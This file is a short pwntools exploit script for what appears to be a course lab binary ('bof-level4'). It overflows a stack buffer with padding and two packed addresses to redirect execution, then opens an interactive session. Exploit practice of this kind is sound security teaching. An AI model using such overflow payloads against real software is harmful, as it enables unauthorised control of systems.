#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level4/bof-level4')

buffer = "A"*20
buffer += "ABCDEFGH"
buffer += "A"*8
buffer += p32(0x0804876b)
buffer += "a"*12
buffer += p32 (0x08048530)


p.sendline(buffer)
p.interactive()
